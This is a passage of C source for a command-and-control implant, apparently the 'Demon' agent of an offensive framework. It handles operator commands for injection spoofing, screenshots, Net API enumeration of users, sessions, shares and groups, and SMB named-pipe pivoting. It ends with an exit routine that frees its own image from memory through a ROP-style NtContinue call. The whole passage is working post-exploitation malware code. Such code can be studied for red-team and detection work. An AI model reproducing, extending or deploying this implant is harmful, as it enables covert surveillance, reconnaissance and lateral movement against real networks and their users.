            Instance->Config.Memory.Execute = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Memory.Execute );
            break;
        }

        case DEMON_CONFIG_INJECTION_TECHNIQUE:
        {
            Instance->Config.Inject.Technique = ParserGetInt32( Parser );
            PackageAddInt32( Package, Instance->Config.Inject.Technique );
            break;
        }

        case DEMON_CONFIG_INJECTION_SPOOFADDR:
        {
            DWORD   LibSize    = 0;
            DWORD   FuncSize   = 0;
            PCHAR   Library    = ParserGetBytes( Parser, &LibSize );
            PCHAR   Function   = ParserGetBytes( Parser, &FuncSize );
            UINT32  Offset     = ParserGetInt32( Parser );
            PVOID   ThreadAddr = NULL;

            Library[ LibSize ] = 0;
            Function[ FuncSize ] = 0;

            PRINTF( "Library  => %s\n", Library );
            PRINTF( "Function => %s\n", Function );
            PRINTF( "Offset => %x\n", Offset );

            if ( Library )
            {
                PVOID hLib = NULL;

                // TODO: check in the current PEB too
                hLib = LdrModuleLoad( Library );
                PRINTF( "hLib => %x\n", hLib );

                if ( hLib )
                {
                    ThreadAddr = LdrFunctionAddr( hLib, HashStringA( Function ) );

                    if ( ThreadAddr )
                        Instance->Config.Inject.SpoofAddr = ThreadAddr + Offset;

                    else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_INVALID_FUNCTION );

                    PRINTF( "ThreadAddr => %x\n", ThreadAddr );
                }
                else PackageTransmitError( CALLBACK_ERROR_WIN32, ERROR_MOD_NOT_FOUND );
            }

            PackageAddBytes( Package, Library, LibSize );
            PackageAddBytes( Package, Function, FuncSize );

            break;
        }

        case DEMON_CONFIG_PROCESS_SPAWN:
        {
            DWORD Size = 0;

            Instance->Config.Process.Spawn64 = ParserGetBytes( Parser, &Size );
            Instance->Config.Process.Spawn64[ Size ] = 0;

            PRINTF( "Instance->Config.Process.Spawn64 => %s\n", Instance->Config.Process.Spawn64 );
            PackageAddBytes( Package, Instance->Config.Process.Spawn64, Size );

            break;
        }

        default:
            PackageAddInt32( Package, 0 );
            break;
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandScreenshot( PPARSER Parser )
{
    PUTS( "Screenshot" )
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_SCREENSHOT );
    PVOID    Image   = NULL;
    SIZE_T   Size    = NULL;

    if ( W32TakeScreenShot( &Image, &Size ) )
    {
        PUTS( "Successful took screenshot" )
        PackageAddInt32( Package, TRUE );
        PackageAddBytes( Package, Image, Size );
    }
    else
    {
        PUTS( "Failed to take screenshot" )
        PackageAddInt32( Package, FALSE );
    }

    PackageTransmit( Package, NULL, 0 );
}

// TODO: The Net module is unstable so fix those issues to work on normal workstation and domain server
VOID CommandNet( PPARSER Parser )
{
    PUTS( "NET COMMAND" )
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_NET );
    UINT32   NetCommand = ParserGetInt32( Parser );

    PackageAddInt32( Package, NetCommand );

    switch ( NetCommand )
    {
        case DEMON_NET_COMMAND_DOMAIN:
        {
            PUTS( "DEMON_NET_COMMAND_DOMAIN" )

            LPSTR Domain = NULL;
            DWORD Length = 0;

            if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, NULL, &Length ) )
            {
                if ( ( Domain = Instance->Win32.LocalAlloc( LPTR, Length ) ) )
                {
                    if ( ! Instance->Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                    {
                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                        PackageDestroy( Package );
                    }
                }
            }

            PackageAddBytes( Package, Domain, Length );

            if ( Domain )
            {
                MemSet( Domain, 0, Length );
                Instance->Win32.LocalFree( Domain );
            }

            break;
        }

        case DEMON_NET_COMMAND_LOGONS:
        {
            PUTS( "DEMON_NET_COMMAND_LOGONS" )

            LPWKSTA_USER_INFO_0 UserInfo        = NULL;
            DWORD               dwLevel         = 0;
            DWORD               dwEntriesRead   = 0;
            DWORD               dwTotalEntries  = 0;
            DWORD               dwResumeHandle  = 0;
            DWORD               NetStatus       = NULL;
            CHAR                UserName[ 260 ] = { 0 };
            DWORD               UserNameSize    = 0;
            LPWSTR              ServerName      = NULL;

            ServerName = ParserGetBytes( Parser, &UserNameSize );

            PackageAddBytes( Package, ServerName, UserNameSize );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance->Win32.NetWkstaUserEnum( ServerName, dwLevel, &UserInfo, MAX_PREFERRED_LENGTH, &dwEntriesRead, &dwTotalEntries, &dwResumeHandle );
                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; ( i < dwEntriesRead ); i++ )
                    {
                        if ( UserInfo == NULL )
                            break;

                        UserNameSize = StringLengthW( UserInfo[i].wkui0_username );

                        MemSet( UserName, 0, 260 );
                        UserNameSize = WCharStringToCharString( UserName, UserInfo[i].wkui0_username, UserNameSize );

                        PackageAddBytes( Package, UserName, UserNameSize );
                    }
                }
                else
                {
                    NtSetLastError( Instance->Win32.RtlNtStatusToDosError( NetStatus ) );

                    PRINTF( "NetWkstaUserEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto CLEANUP;
                }

                if ( UserInfo )
                {
                    Instance->Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( UserInfo != NULL )
                Instance->Win32.NetApiBufferFree( UserInfo );

            break;

        CLEANUP:
            if ( UserInfo != NULL )
                Instance->Win32.NetApiBufferFree( UserInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_SESSIONS:
        {
            PUTS( "DEMON_NET_COMMAND_SESSIONS" )

            LPSESSION_INFO_10 SessionInfo       = NULL;
            DWORD             EntriesRead       = 0;
            DWORD             TotalEntries      = 0;
            DWORD             ResumeHandle      = 0;
            LPWSTR            ServerName        = NULL;
            DWORD             NetStatus         = 0;
            CHAR              ClientName[ 260 ] = { 0 };
            DWORD             ClientNameSize    = 0;
            CHAR              UserName[ 260 ]   = { 0 };
            DWORD             UserNameSize      = 0;

            ServerName = ParserGetBytes( Parser, &UserNameSize );

            PackageAddBytes( Package, ServerName, UserNameSize );

            UserNameSize = 0;
            do
            {
                NetStatus = Instance->Win32.NetSessionEnum( ServerName, NULL, NULL, 10, &SessionInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &ResumeHandle );

                if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
                {
                    for ( INT i = 0; i < EntriesRead ; i++ )
                    {
                        if ( SessionInfo == NULL )
                            break;

                        ClientNameSize = WCharStringToCharString( ClientName, SessionInfo[i].sesi10_cname, StringLengthW( SessionInfo[i].sesi10_cname ) );
                        UserNameSize   = WCharStringToCharString( UserName, SessionInfo[i].sesi10_username, StringLengthW( SessionInfo[i].sesi10_username ) );

                        PackageAddBytes( Package, ClientName, ClientNameSize );
                        PackageAddBytes( Package, UserName, UserNameSize );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_time );
                        PackageAddInt32( Package, SessionInfo[i].sesi10_idle_time );
                    }
                }
                else
                {
                    PRINTF( "NetSessionEnum: Failed [%d]\n", NtGetLastError() );
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    goto SESSION_CLEANUP;
                }

                if ( SessionInfo != NULL )
                {
                    Instance->Win32.NetApiBufferFree( SessionInfo );
                    SessionInfo = NULL;
                }
            }
            while ( NetStatus == ERROR_MORE_DATA );

            if ( SessionInfo )
                Instance->Win32.NetApiBufferFree( SessionInfo );

            break;

        SESSION_CLEANUP:
            if ( SessionInfo != NULL )
                Instance->Win32.NetApiBufferFree( SessionInfo );

            PackageDestroy( Package );
            return;
        }

        case DEMON_NET_COMMAND_COMPUTER:
        {
            PUTS( "DEMON_NET_COMMAND_COMPUTER" )

            break;
        }

        case DEMON_NET_COMMAND_DCLIST:
        {
            PUTS( "DEMON_NET_COMMAND_DCLIST" )
            break;
        }

        case DEMON_NET_COMMAND_SHARE:
        {
            PUTS( "DEMON_NET_COMMAND_SHARE" )

            PSHARE_INFO_502 ShareInfo    = NULL;
            DWORD           NetStatus    = 0;
            DWORD           Entries      = 0;
            DWORD           TotalEntries = 0;
            DWORD           Resume       = 0;
            LPWSTR          ServerName   = NULL;
            DWORD           ServerSize   = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );
            do
            {
                NetStatus = Instance->Win32.NetShareEnum ( ServerName, 502, &ShareInfo, MAX_PREFERRED_LENGTH, &Entries, &TotalEntries, &Resume );
                if( ( NetStatus == ERROR_SUCCESS ) || ( NetStatus == ERROR_MORE_DATA ) )
                {

                    for( DWORD i = 0; i < Entries; i++ )
                    {
                        PRINTF( "%-5ls %-20ls %d %-20ls\n", ShareInfo[i].shi502_netname, ShareInfo[i].shi502_path, ShareInfo[i].shi502_permissions, ShareInfo[i].shi502_remark );

                        PackageAddBytes( Package, ShareInfo[i].shi502_netname, StringLengthW( ShareInfo[i].shi502_netname ) * 2 );
                        PackageAddBytes( Package, ShareInfo[i].shi502_path, StringLengthW( ShareInfo[i].shi502_path ) * 2 );
                        PackageAddBytes( Package, ShareInfo[i].shi502_remark, StringLengthW( ShareInfo[i].shi502_remark ) * 2 );
                        PackageAddInt32( Package, ShareInfo[i].shi502_permissions );
                    }

                    Instance->Win32.NetApiBufferFree( ShareInfo );
                    ShareInfo = NULL;
                }
                else
                    PRINTF( "Error: %ld\n", NetStatus );
            }
            while ( NetStatus == ERROR_MORE_DATA );

            break;
        }

        case DEMON_NET_COMMAND_LOCALGROUP:
        {
            PUTS( "DEMON_NET_COMMAND_LOCALGROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            DWORD               Resume        = 0;

            WCHAR               Group[ 260 ]  = { 0 };
            DWORD               GroupSize     = 0;

            WCHAR               Desc[260 * 2] = { 0 };
            WCHAR               DescSize      = { 0 };

            LPWSTR              ServerName    = NULL;
            DWORD               ServerSize    = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );

            PRINTF( "ServerName => %ls\n", ServerName );

            NetStatus = Instance->Win32.NetLocalGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, &Resume );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                PUTS( "NetLocalGroupEnum => Success" )
                if ( GroupInfo )
                {
                    for( DWORD i = 0; i < EntriesRead; i++ )
                    {
                        MemSet( Group, 0, 260 );
                        MemSet( Desc,  0, 260 * 2 );

                        GroupSize = WCharStringToCharString( Group, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) );
                        DescSize  = WCharStringToCharString( Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) );

                        PackageAddBytes( Package, Group, GroupSize );
                        PackageAddBytes( Package, Desc, DescSize );
                    }

                    Instance->Win32.NetApiBufferFree( GroupInfo );
                    GroupInfo = NULL;
                }
            }

            break;
        }

        case DEMON_NET_COMMAND_GROUP:
        {
            PUTS( "DEMON_NET_COMMAND_GROUP" )

            PLOCALGROUP_INFO_1  GroupInfo     = NULL;
            DWORD               EntriesRead   = 0;
            DWORD               TotalEntries  = 0;
            DWORD               NetStatus     = 0;
            DWORD               Resume        = 0;

            WCHAR               Group[ 260 ]  = { 0 };
            DWORD               GroupSize     = 0;

            WCHAR               Desc[260 * 2] = { 0 };
            WCHAR               DescSize      = { 0 };

            LPWSTR              ServerName    = NULL;
            WCHAR               Server[ 260 ] = { 0 };
            DWORD               ServerSize    = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );

            NetStatus = Instance->Win32.NetGroupEnum( ServerName, 1, &GroupInfo, -1, &EntriesRead, &TotalEntries, &Resume );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                if ( GroupInfo )
                {
                    for( DWORD i = 0;i < EntriesRead; i++ )
                    {
                        MemSet( Group, 0, 260 );
                        MemSet( Desc, 0, 260 * 2 );

                        GroupSize = WCharStringToCharString( Group, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) );
                        DescSize  = WCharStringToCharString( Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) );

                        PackageAddBytes( Package, Group, GroupSize );
                        PackageAddBytes( Package, Desc, DescSize );
                    }
                }

                Instance->Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            if ( GroupInfo )
            {
                Instance->Win32.NetApiBufferFree( GroupInfo );
                GroupInfo = NULL;
            }

            break;
        }

        case DEMON_NET_COMMAND_USER:
        {
            PUTS( "DEMON_NET_COMMAND_USER" )

            LPUSER_INFO_0  UserInfo     = NULL;
            DWORD          NetStatus    = 0;
            DWORD          EntriesRead  = 0;
            DWORD          TotalEntries = 0;
            DWORD          Resume       = 0;

            LPWSTR         ServerName   = NULL;
            DWORD          ServerSize   = 0;
            CHAR           User[ 260 ]  = { 0 };
            DWORD          UserSize     = 0;

            ServerName = ParserGetBytes( Parser, &ServerSize );
            PackageAddBytes( Package, ServerName, ServerSize );

            NetStatus = Instance->Win32.NetUserEnum( NULL, 0, 0, &UserInfo, MAX_PREFERRED_LENGTH, &EntriesRead, &TotalEntries, &Resume );
            PRINTF( "NetStatus => %d\n", NetStatus );
            if ( ( NetStatus == NERR_Success ) || ( NetStatus == ERROR_MORE_DATA ) )
            {
                PRINTF( "EntriesRead => %d\n", EntriesRead );
                for( DWORD i = 0; i < EntriesRead; i++ )
                {
                    PRINTF( "User => %ls\n", UserInfo[ i ].usri0_name );
                    if ( UserInfo[ i ].usri0_name )
                    {
                        UserSize = WCharStringToCharString( User, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) );
                        PackageAddBytes( Package, User, UserSize );

                        /* if ( ( UserInfo[ i ].usri3_priv & USER_PRIV_ADMIN ) == 0 )
                            PackageAddInt32( Package, FALSE );
                        else
                            PackageAddInt32( Package, TRUE ); */

                        PackageAddInt32( Package, FALSE );

                        MemSet( User, 0, 260 );
                    }
                }

                if ( UserInfo )
                {
                    Instance->Win32.NetApiBufferFree( UserInfo );
                    UserInfo = NULL;
                }
            }
            else
            {
                PRINTF( "NetGroupEnum: Failed [%d : %d]\n", NtGetLastError(), NetStatus );
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
            }

            break;
        }

        default:
        {
            PUTS( "COMMAND NOT FOUND" )
            break;
        }
    }

    PackageTransmit( Package, NULL, NULL );
}

VOID CommandPivot( PPARSER Parser )
{
    PPACKAGE Package = PackageCreate( DEMON_COMMAND_PIVOT );
    DWORD    Pivot   = ParserGetInt32( Parser );

    PackageAddInt32( Package, Pivot );

    PRINTF( "Pivot => %d\n", Pivot );

    switch ( Pivot )
    {
        case DEMON_PIVOT_LIST:
        {
            PUTS( "DEMON_PIVOT_LIST" )
            PPIVOT_DATA TempList = Instance->SmbPivots;

            do
            {
                if ( TempList )
                {
                    PRINTF( "Pivot List => DemonId:[%x] Named Pipe:[%s]\n", TempList->DemonID, TempList->PipeName )

                    PackageAddInt32( Package, TempList->DemonID );
                    PackageAddBytes( Package, TempList->PipeName, StringLengthA( TempList->PipeName ) );

                    TempList = TempList->Next;
                } else break;
            }
            while ( TRUE );

            break;
        }

        case DEMON_PIVOT_SMB_CONNECT:
        {
            PUTS( "DEMON_PIVOT_SMB_CONNECT" )

            DWORD BytesSize = 0;
            PVOID Output    = NULL;
            LPSTR PipeName  = NULL;

            PipeName = ParserGetBytes( Parser, NULL );

            if ( PivotAdd( PipeName, &Output, &BytesSize ) )
            {
                PRINTF( "Successful connected: %x : %d\n", Output, BytesSize )

                PackageAddInt32( Package, TRUE );
                PackageAddBytes( Package, Output, BytesSize );

#ifdef DEBUG
                PPIVOT_DATA TempList = Instance->SmbPivots;

                printf( "Smb Pivots : [ " );
                do {
                    if ( TempList )
                    {
                        printf( "%x ", TempList->DemonID );
                        TempList = TempList->Next;
                    } else
                        break;
                } while ( TRUE );
                puts( "]" );
#endif
            }
            else
            {
                PUTS( "Failed to connect" )
                PackageAddInt32( Package, FALSE );
                PackageAddInt32( Package, NtGetLastError() );
            }

            break;
        }

        case DEMON_PIVOT_SMB_DISCONNECT:
        {

        }

        case DEMON_PIVOT_SMB_COMMAND:
        {
            PUTS( "DEMON_PIVOT_SMB_COMMAND" )

            UINT32      DemonId   = ParserGetInt32( Parser );
            DWORD       Size      = 0;
            PVOID       Data      = ParserGetBytes( Parser, &Size );
            PPIVOT_DATA TempList  = Instance->SmbPivots;
            PPIVOT_DATA PivotData = NULL;

            PRINTF( "Search DemonId => %x\n", DemonId );
            do
            {
                if ( TempList ) {
                    // if the specified demon was found break the loop
                    if ( TempList->DemonID == DemonId ) {
                        PivotData = TempList;
                        PRINTF( "Found Demon: %x\n", TempList->DemonID );
                        break;
                    }
                    // select the next pivot
                    TempList = TempList->Next;
                } else break;
            } while ( TRUE );

            if ( PivotData )
            {
                if ( ! Instance->Win32.WriteFile( PivotData->Handle, Data, Size, &Size, NULL ) )
                {
                    PRINTF( "WriteFile: Failed[%d]\n", NtGetLastError() );
                    SEND_WIN32_BACK
                } else PUTS( "Successful wrote demon data" )
            } else PUTS( "Didn't found demon pivot" )
        }
    }

    PUTS( "Pivot transport" )
    PackageTransmit( Package, NULL, NULL );
}

// TODO: rewrite this. disconnect all pivots. kill our threads. release memory and free itself.
VOID CommandExit( PPARSER Parser )
{
    PUTS( "Exit" )

    PPACKAGE Package         = PackageCreate( DEMON_EXIT );
    UINT32   ThreadOrProcess = ParserGetInt32( Parser );
    CONTEXT  RopExit         = { 0 };
    LPVOID   ImageBase       = NULL;
    SIZE_T   ImageSize       = 0;

    PackageAddInt32( Package, ThreadOrProcess );
    PackageTransmit( Package, NULL, NULL );

    // TODO: release every resource we allocated...

    ImageBase = C_PTR( Instance->Session.ModuleBase );
    ImageSize = IMAGE_SIZE( ImageBase );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance->Win32.RtlCaptureContext( &RopExit );

    RopExit.Rip = U_PTR( Instance->Syscall.NtFreeVirtualMemory );
    RopExit.Rsp = ( RopExit.Rsp &~ ( 0x1000 - 1 ) ) - 0x1000;
    RopExit.Rcx = U_PTR( NtCurrentProcess() );
    RopExit.Rdx = U_PTR( &ImageBase );
    RopExit.R8  = U_PTR( &ImageSize );
    RopExit.R9  = U_PTR( MEM_RELEASE );

    if ( ThreadOrProcess == 1 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserThread );

    else if ( ThreadOrProcess == 2 )
        *( ULONG_PTR volatile * ) ( RopExit.Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = U_PTR( Instance->Win32.RtlExitUserProcess );

    RopExit.ContextFlags = CONTEXT_FULL;
    Instance->Syscall.NtContinue( &RopExit, FALSE );
}
